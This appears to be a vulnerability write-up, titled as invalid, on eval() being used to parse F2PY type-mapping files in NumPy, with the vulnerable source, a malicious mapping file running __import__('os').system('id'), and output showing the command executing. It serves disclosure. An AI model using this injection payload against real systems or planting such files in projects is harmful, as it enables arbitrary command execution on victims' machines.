---
layout: post
title:  "Unsafe eval via f2py in Numpy(Invalid)"
date:  2024-07-03 10:31:06 +0800
categories: file-overwrite
---

## Name

> Unsafe eval via f2py in Numpy

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 2.0.0

## Description

[F2PY](https://numpy.org/doc/stable/f2py/index.html#f2py-user-guide-and-reference-manual) distributed as part of NumPy which is used to convert fortan module to python module. It will convert fortan module to C `.so` module for python to import. During conversion, F2PY needs to know what would be the corresponding C type and a general solution for that would be too complicated to implement. A json file containing fortan type to C type mapping can be passed to F2PY by using the [--f2cmap option](https://numpy.org/doc/stable/f2py/advanced/use_cases.html#dealing-with-kind-specifiers) during conversion:

The mapping file format:

```
<Fortran typespec> : {<selector_expr>:<C type>}
```

A mapping file example:

```
{'real': {'KIND(0.0D0)': 'double'}}
```

However, during loading of f2cmap file, [load_f2cmap_file](https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L138C5-L138C21) is called and `eval()` is used to parse the json content in the mapping file. If a victim loads a malicious mapping file, command injection can be achieved.

The vulnerable sink: [load_f2cmap_file#L157](https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157):

```
def load_f2cmap_file(f2cmap_file):
    global f2cmap_all, f2cmap_mapped

    f2cmap_all = copy.deepcopy(f2cmap_default)

    if f2cmap_file is None:
        # Default value
        f2cmap_file = '.f2py_f2cmap'
        if not os.path.isfile(f2cmap_file):
            return

    try:
        outmess('Reading f2cmap from {!r} ...\n'.format(f2cmap_file))
        with open(f2cmap_file) as f:
            # vulnerable to command injection
            d = eval(f.read().lower(), {}, {})
        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)
        outmess('Successfully applied user defined f2cmap changes\n')
    except Exception as msg:
        errmess('Failed to apply user defined f2cmap changes: %s. Skipping.\n' % (msg))
```

## Proof of Concept

Firstly, let's create a malicous mapping file named `mapfile.txt`:

```
__import__('os').system('id')
```

Then, install numpy:

```
pip install --upgrade numpy
```

### Start attack

Load `mapfile.txt` using `F2PY`:

```
f2py -c test.f --f2cmap mapfile.txt
```

Now let's check the output, the command `id` is executed successfully:

```
running build
running config_cc
INFO: unifing config_cc, config, build_clib, build_ext, build commands --compiler options
running config_fc
INFO: unifing config_fc, config, build_clib, build_ext, build commands --fcompiler options
running build_src
INFO: build_src
INFO: building extension "untitled" sources
INFO: f2py options: ['--f2cmap', 'mapfile.txt']
INFO: f2py:> /tmp/tmpgkxylea2/src.linux-x86_64-3.10/untitledmodule.c
creating /tmp/tmpgkxylea2/src.linux-x86_64-3.10
OSError: [Errno 2] No such file or directory: 'test.f'. Skipping file "test.f".
Reading f2cmap from 'mapfile.txt' ...
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)
```

## Colab

Tested on google colab: [https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing](https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing)

![poc](https://live.staticflickr.com/65535/53834219079_360ff6894d_h.jpg)

## Impact

This vulnerability can have severe consequences. If victims load an malicious mapping file, command injection can be achieved.

## Occurrences

[load_f2cmap_file#L157](https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157)

